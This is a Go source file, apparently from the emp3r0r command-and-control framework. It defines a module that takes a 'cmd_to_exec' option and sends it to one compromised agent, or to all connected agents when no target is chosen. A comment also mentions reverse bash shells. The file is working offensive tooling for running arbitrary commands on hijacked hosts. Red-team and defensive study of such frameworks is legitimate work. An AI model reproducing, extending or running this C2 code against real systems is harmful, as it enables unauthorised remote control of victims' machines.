package modules

import (
	"sync"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// RShellStatus stores errors from reverseBash
var RShellStatus sync.Map

// ModuleCmd exec cmd on target
func ModuleCmd(ctx *c2context.C2Context) {
	// check if ActiveModule and Options are valid
	// In context-based approach, we check Flags
	// but live.ActiveModule might still be used for static config if needed,
	// but options should come from ctx.Flags

	// send command
	execOnTarget := func(target *def.Emp3r0rAgent) {
		cmdOpt, ok := ctx.Flags["cmd_to_exec"]
		if !ok {
			logging.Errorf("Option 'cmd_to_exec' not found")
			return
		}
		jobID := ""
		if ctx.Job != nil {
			jobID = ctx.Job.ID
		}
		err := CmdSender(cmdOpt, jobID, target.Tag)
		if err != nil {
			logging.Errorf("ModuleCmd: %v", err)
		}
	}

	// find target
	target := ctx.Target
	if target == nil {
		cmdOpt, ok := ctx.Flags["cmd_to_exec"]
		if !ok {
			logging.Errorf("Option 'cmd_to_exec' not found")
			return
		}
		logging.Warningf("emp3r0r will execute `%s` on all targets this time", cmdOpt)
		// Access agent list safely
		for _, target := range agents.GetConnectedAgents() {
			execOnTarget(target)
		}
		return
	}

	execOnTarget(target)
}
